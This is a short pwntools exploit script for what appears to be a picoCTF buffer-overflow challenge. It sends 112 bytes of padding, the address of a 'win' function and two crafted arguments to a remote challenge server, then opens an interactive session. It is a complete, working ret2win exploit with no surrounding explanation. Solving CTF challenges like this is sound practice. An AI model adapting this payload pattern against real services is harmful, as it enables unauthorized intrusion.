#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 65109)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    param1 = -0x35010ff3
    param2 = -0xff20ff3
    winfun = 0x8049296
    pop = 0x08049452
    payload = flat(b'A'*112, winfun, b'A'*4, param1, param2)
    io.sendlineafter(b':', payload)

    io.interactive()

if __name__ == "__main__":
    main()
